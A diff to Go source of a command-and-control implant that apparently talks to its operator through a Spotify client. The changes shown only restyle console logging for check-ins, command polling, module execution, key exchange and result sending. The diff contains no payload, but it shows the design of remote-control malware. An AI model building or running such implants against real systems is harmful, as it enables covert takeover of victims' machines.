@@ -76,11 +76,16 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 	var ephPub *ecdh.PublicKey
 	if ephPriv != nil {
 		ephPub = ephPriv.PublicKey()
-		fmt.Printf("[*] X25519 pubkey: %s\n", hex.EncodeToString(ephPub.Bytes()))
 	}
 
-	fmt.Printf("[*] Polling every %d-%ds\n", interval-jitter, interval+jitter)
-	fmt.Printf("[*] Session: %s\n", sessionID[:12])
+	fmt.Printf("\033[36m  Interval : %d-%ds | Session : %s\033[0m\n",
+		interval-jitter, interval+jitter, sessionID[:12])
+	fmt.Printf("  \033[90mClient ID : %s\033[0m\n", clientID)
+	if ephPub != nil {
+		fmt.Printf("  \033[90mX25519    : %s\033[0m\n",
+			hex.EncodeToString(ephPub.Bytes())[:24]+"...")
+	}
+	fmt.Println()
 	return &Implant{
 		client:          client,
 		key:             key,
@@ -201,8 +206,8 @@ func (imp *Implant) sendCheckin() {
 		imp.checkinPending = true
 		return
 	}
-	fmt.Printf("[*] Check-in sent (client_id=%s) at %s\n",
-		imp.clientID, time.Now().Format("15:04:05"))
+	fmt.Printf("\033[32m[+] Check-in sent\033[0m (%s) at %s\n",
+		imp.clientID[:8], time.Now().Format("15:04:05"))
 	imp.checkinPending = false
 	imp.lastCheckin = time.Now()
 }
@@ -298,7 +303,7 @@ func (imp *Implant) resultWriter() {
 
 // Run starts the main polling loop.
 func (imp *Implant) Run() {
-	fmt.Println("[*] Implant started, polling for commands...")
+	fmt.Println("\033[32m[*] Implant active — polling for commands\033[0m")
 	imp.sendCheckin()
 
 	// Start async result writer
@@ -468,7 +473,7 @@ func (imp *Implant) pollAndExecute() {
 			continue
 		}
 
-		fmt.Printf("[*] Executing seq=%d module=%s\n", seqNum, msg.Module)
+		fmt.Printf("\033[36m[>] Exec\033[0m seq=%d %s\n", seqNum, msg.Module)
 
 		// Async execution: dispatch to goroutine, send result via channel
 		imp.wg.Add(1)
@@ -530,7 +535,7 @@ func (imp *Implant) handleKeyExchange(msg *protocol.C2Message) {
 	}
 
 	imp.sessionKey = sessionKey
-	fmt.Printf("[*] Forward secrecy established at %s\n",
+	fmt.Printf("\033[32m[+] Forward secrecy established\033[0m at %s\n",
 		time.Now().Format("15:04:05"))
 }
 
@@ -582,5 +587,5 @@ func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) 
 		return
 	}
 
-	fmt.Printf("[*] Result sent for seq=%d\n", result.Seq)
+	fmt.Printf("\033[90m[<] Result sent seq=%d\033[0m\n", result.Seq)
 }
